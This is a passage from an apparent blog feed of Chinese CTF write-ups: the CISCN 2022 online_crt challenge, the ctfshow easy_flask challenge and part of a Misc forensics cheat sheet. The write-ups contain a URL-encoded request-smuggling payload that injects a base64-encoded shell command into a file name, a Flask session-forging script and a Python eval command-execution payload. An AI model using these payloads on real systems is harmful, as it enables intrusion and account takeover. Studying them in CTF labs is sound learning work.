punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span> <span class="token operator">||</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>newname<span class="token punctuation">,</span> <span class="token string">".."</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token string">"error"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawPath <span class="token operator">!=</span> <span class="token string">""</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Host <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token punctuation">&#123;</span>err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">Rename</span><span class="token punctuation">(</span>staticPath<span class="token operator">+</span>oldname<span class="token punctuation">,</span> staticPath<span class="token operator">+</span>newname<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> newname<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">index</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>router <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/admin/rename"</span><span class="token punctuation">,</span> admin<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> router<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8887"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h2><h3 id="进入-x2F-getcrt生成证书"><a href="#进入-x2F-getcrt生成证书" class="headerlink" title="进入&#x2F;getcrt生成证书"></a>进入&#x2F;getcrt生成证书</h3><p><img src="/2023/04/10/[CISCN%202022%20%E5%88%9D%E8%B5%9B]online_crt%E5%A4%8D%E7%8E%B0/get.png"></p><h3 id="构造payload，用bp发包"><a href="#构造payload，用bp发包" class="headerlink" title="构造payload，用bp发包"></a>构造payload，用bp发包</h3><p>bp里添加表单,因为源码中Rawpath,需要有url编码</p><pre class="line-numbers language-none"><code class="language-none">Content-Type: application&#x2F;x-www-form-urlencoded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">uri&#x3D;&#x2F;admin%252frename%3Foldname%3D27dd1cf0-679e-410e-a0fb-5b5864261b60.crt%26newname%3D%60echo%2520Y2F0IC8qIA%3D%3D%7Cbase64%2520--decode%7Cbash%3Eflag.txt%60.crt%20HTTP&#x2F;1.1%0D%0AHost%3A%20admin%0D%0AContent-Length%3A%20136%0D%0AConnection%3A%20close%0D%0A%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/04/10/[CISCN%202022%20%E5%88%9D%E8%B5%9B]online_crt%E5%A4%8D%E7%8E%B0/%E4%BF%AE%E6%94%B9.png"></p><h3 id="访问-x2F-static-x2F-crt路由，获取flag"><a href="#访问-x2F-static-x2F-crt路由，获取flag" class="headerlink" title="访问&#x2F;static&#x2F;crt路由，获取flag"></a>访问&#x2F;static&#x2F;crt路由，获取flag</h3><p><img src="/2023/04/10/[CISCN%202022%20%E5%88%9D%E8%B5%9B]online_crt%E5%A4%8D%E7%8E%B0/flag.png"></p>]]></content>
      
      
      <categories>
          
          <category> CISCN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow愚人杯easy_flask wp</title>
      <link href="/2023/04/09/easy_flask%20wp/"/>
      <url>/2023/04/09/easy_flask%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow愚人杯easy-flask-wp"><a href="#ctfshow愚人杯easy-flask-wp" class="headerlink" title="ctfshow愚人杯easy_flask wp"></a>ctfshow愚人杯easy_flask wp</h1><hr><p><em>@_@</em><br><em>2023.4.9</em></p><hr><h2 id="admin注册"><a href="#admin注册" class="headerlink" title="admin注册"></a>admin注册</h2><p>先进行admin注册与登录尝试，发现admin账户已存在，且无法被重复注册覆盖。<br>尝试注册账户登入<br><img src="/2023/04/09/easy_flask%20wp/123456%E6%B3%A8%E5%86%8C.png" alt="123456注册"><br><img src="/2023/04/09/easy_flask%20wp/user%E7%99%BB%E5%BD%95.png" alt="user登录"><br>从登录页面可以看到，他会给admin一个只有admin才能看到的文件，查看app.py,发现可以用于解密session的key，接下来尝试伪造session以admin身份登录<br><img src="/2023/04/09/easy_flask%20wp/%E6%BA%90%E7%A0%811.png" alt="源码1"></p><h2 id="伪造session"><a href="#伪造session" class="headerlink" title="伪造session"></a>伪造session</h2><p>获取session<br><img src="/2023/04/09/easy_flask%20wp/session%E8%8E%B7%E5%8F%96.png" alt="session获取"><br>得到session：<br>eyJsb2dnZWRpbiI6dHJ1ZSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6IjEyMzQ1NiJ9.ZDPH3g.KGRKWuCAjIhqCj0nkTiEZ8oXsRI<br>通过如下脚本进行加密与解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">import</span> ast<span class="token comment"># Abstract Base Classes (PEP 3119)</span><span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>  <span class="token comment"># &lt; 3.0</span>    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Must be using at least Python 3'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">and</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token comment"># >= 3.0 &amp;&amp; &lt; 3.4</span>    <span class="token keyword">from</span> abc <span class="token keyword">import</span> ABCMeta<span class="token punctuation">,</span> abstractmethod<span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># > 3.4</span>    <span class="token keyword">from</span> abc <span class="token keyword">import</span> ABC<span class="token punctuation">,</span> abstractmethod<span class="token comment"># Lib for argument parsing</span><span class="token keyword">import</span> argparse<span class="token comment"># external Imports</span><span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">if</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">and</span> sys<span class="token punctuation">.</span>version_info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token comment"># >= 3.0 &amp;&amp; &lt; 3.4</span>    <span class="token keyword">class</span> <span class="token class-name">FSCM</span><span class="token punctuation">(</span>metaclass<span class="token operator">=</span>ABCMeta<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Encode a Flask session cookie """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                session_cookie_structure <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">)</span>                si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e        <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Decode a Flask cookie  """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    compressed <span class="token operator">=</span> <span class="token boolean">False</span>                    payload <span class="token operator">=</span> session_cookie_value                    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        compressed <span class="token operator">=</span> <span class="token boolean">True</span>                        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">if</span> compressed<span class="token punctuation">:</span>                        data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">return</span> data                <span class="token keyword">else</span><span class="token punctuation">:</span>                    app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                    si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                    s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                    <span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Decoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e<span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token comment"># > 3.4</span>    <span class="token keyword">class</span> <span class="token class-name">FSCM</span><span class="token punctuation">(</span>ABC<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Encode a Flask session cookie """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                session_cookie_structure <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">)</span>                si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                <span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e        <span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token triple-quoted-string string">""" Decode a Flask cookie  """</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    compressed <span class="token operator">=</span> <span class="token boolean">False</span>                    payload <span class="token operator">=</span> session_cookie_value                    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                        compressed <span class="token operator">=</span> <span class="token boolean">True</span>                        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>                    data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">if</span> compressed<span class="token punctuation">:</span>                        data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span>                    <span class="token keyword">return</span> data                <span class="token keyword">else</span><span class="token punctuation">:</span>                    app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>                    si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>                    s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span>                    <span class="token keyword">return</span> s<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"[Decoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>                <span class="token keyword">raise</span> e<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># Args are only relevant for __main__ usage</span>    <span class="token comment">## Description for help</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>        description<span class="token operator">=</span><span class="token string">'Flask Session Cookie Decoder/Encoder'</span><span class="token punctuation">,</span>        epilog<span class="token operator">=</span><span class="token string">"Author : Wilson Sumanang, Alexandre ZANNI"</span><span class="token punctuation">)</span>    <span class="token comment">## prepare sub commands</span>    subparsers <span class="token operator">=</span> parser<span class="token punctuation">.</span>add_subparsers<span class="token punctuation">(</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'sub-command help'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'subcommand'</span><span class="token punctuation">)</span>    <span class="token comment">## create the parser for the encode command</span>    parser_encode <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">'encode'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'encode'</span><span class="token punctuation">)</span>    parser_encode<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span> <span class="token string">'--secret-key'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'&lt;string>'</span><span class="token punctuation">,</span>                               <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Secret key'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    parser_encode<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--cookie-structure'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'&lt;string>'</span><span class="token punctuation">,</span>                               <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Session cookie structure'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment">## create the parser for the decode command</span>    parser_decode <span class="token operator">=</span> subparsers<span class="token punctuation">.</span>add_parser<span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'decode'</span><span class="token punctuation">)</span>    parser_decode<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-s'</span><span class="token punctuation">,</span> <span class="token string">'--secret-key'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'&lt;string>'</span><span class="token punctuation">,</span>                               <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Secret key'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    parser_decode<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'--cookie-value'</span><span class="token punctuation">,</span> metavar<span class="token operator">=</span><span class="token string">'&lt;string>'</span><span class="token punctuation">,</span>                               <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Session cookie value'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token comment">## get args</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">## find the option chosen</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>subcommand <span class="token operator">==</span> <span class="token string">'encode'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>secret_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> args<span class="token punctuation">.</span>cookie_structure <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>FSCM<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>secret_key<span class="token punctuation">,</span> args<span class="token punctuation">.</span>cookie_structure<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>subcommand <span class="token operator">==</span> <span class="token string">'decode'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>secret_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> args<span class="token punctuation">.</span>cookie_value <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>FSCM<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>cookie_value<span class="token punctuation">,</span> args<span class="token punctuation">.</span>secret_key<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> <span class="token punctuation">(</span>args<span class="token punctuation">.</span>cookie_value <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>FSCM<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>args<span class="token punctuation">.</span>cookie_value<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">解密：python session加解密.py decode -s &quot;secret_key&quot; -c &quot;需要解密的session值&quot;加密：python session加解密.py encode -s &quot;secret_key&quot; -t &quot;需要加密的session值&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解密得到session实际内容为</p><pre class="line-numbers language-none"><code class="language-none">  &#123;&#39;loggedin&#39;: True, &#39;role&#39;: &#39;user&#39;, &#39;username&#39;: &#39;123456&#39;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>将role改为admin并加密，然后将得到的session发给服务器，这样就成功以admin身份登录了<br><img src="/2023/04/09/easy_flask%20wp/admin%E7%99%BB%E5%BD%95.png" alt="admin登录"></p><h2 id="hello路由命令执行"><a href="#hello路由命令执行" class="headerlink" title="hello路由命令执行"></a>hello路由命令执行</h2><p>点击click here，我们会得到一个假的flag，查看源码发现，可能存在任意文件下载，结合之前未显示完整的app.py,我们可以下载app.py查看源码<br><img src="/2023/04/09/easy_flask%20wp/%E6%BA%90%E7%A0%812.png" alt="源码2"><br>在app.py中发现hello路由下可以直接命令执行，构造payload<br><img src="/2023/04/09/easy_flask%20wp/%E6%BA%90%E7%A0%813.png" alt="源码3"></p><pre class="line-numbers language-none"><code class="language-none">&#x2F;hello&#x2F;?eval&#x3D;__import__(&quot;os&quot;).popen(&quot;cat &#x2F;flag_is_h3re&quot;).read()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow愚人杯2023 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc</title>
      <link href="/2023/03/16/misc/"/>
      <url>/2023/03/16/misc/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><hr><p><em>@_@</em><br><em>2023.3.16</em></p><hr><h2 id="文件操作与隐写"><a href="#文件操作与隐写" class="headerlink" title="文件操作与隐写"></a>文件操作与隐写</h2><h3 id="文件类型识别"><a href="#文件类型识别" class="headerlink" title="文件类型识别"></a>文件类型识别</h3><h4 id="1-File-命令"><a href="#1-File-命令" class="headerlink" title="1.File 命令"></a>1.File 命令</h4><p>使用场景：不知道后缀名，无法打开文件<br>格式：file 文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file 文件名    <span class="token comment">#Linux下  </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-winhex-x2F-010editer"><a href="#2-winhex-x2F-010editer" class="headerlink" title="2.winhex&#x2F;010editer"></a>2.winhex&#x2F;010editer</h4><p>winhex&#x2F;010editor 使用场景：Windows下通过文件头信息判断文件类型，文件头可在网上查找</p><h4 id="3-文件头残缺-x2F-错误"><a href="#3-文件头残缺-x2F-错误" class="headerlink" title="3.文件头残缺&#x2F;错误"></a>3.文件头残缺&#x2F;错误</h4><p>使用场景：文件头部残缺或文件头部字段错误无法打开正常文件<br>格式：file 文件名</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">file 文件名    <span class="token comment">#Linux下 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="文件分离操作"><a href="#文件分离操作" class="headerlink" title="文件分离操作"></a>文件分离操作</h3><h4 id="1-Binwalk-kali自带"><a href="#1-Binwalk-kali自带" class="headerlink" title="1.Binwalk kali自带"></a>1.Binwalk kali自带</h4><p>用法 </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">binwalk filename <span class="token comment">#分析文件</span>binwalk <span class="token operator">-</span>e filename <span class="token comment">#分离文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>有时候题目会将压缩包放在图片文件中</p><h4 id="2-Foremost"><a href="#2-Foremost" class="headerlink" title="2.Foremost"></a>2.Foremost</h4><p>binwalk无法使用时可以用foremost分离</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">foremost 文件名 <span class="token operator">-</span>o 输出目录名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-dd"><a href="#3-dd" class="headerlink" title="3.dd"></a>3.dd</h4><p>前两者无法使用时可以使用dd手动分离<br>用法：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">dd <span class="token keyword">if</span><span class="token operator">=</span>源文件名 of<span class="token operator">=</span>目标文件名 bs<span class="token operator">=</span>每一块bytes数 count<span class="token operator">=</span>共取多少块 skip<span class="token operator">=</span>跳过多少块开始取<span class="token comment">//跳过skip块后取count块</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="4-16进制数分离"><a href="#4-16进制数分离" class="headerlink" title="4.16进制数分离"></a>4.16进制数分离</h4><p>dd手动分离太复杂，可以用010&#x2F;winhex打开，复制16进制数至新文件中进行分离，可以用查找功能寻找文件头</p><h3 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h3><h4 id="1-Linux下文件合并"><a href="#1-Linux下文件合并" class="headerlink" title="1.Linux下文件合并"></a>1.Linux下文件合并</h4><p>cat 合并的文件 &gt; 输出的文件名</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">cat gif01 gif02 <span class="token operator">></span> <span class="token number">1.</span>gifcat gif<span class="token operator">*</span> <span class="token operator">></span> <span class="token number">2.</span>gif<span aria-hidden="true" 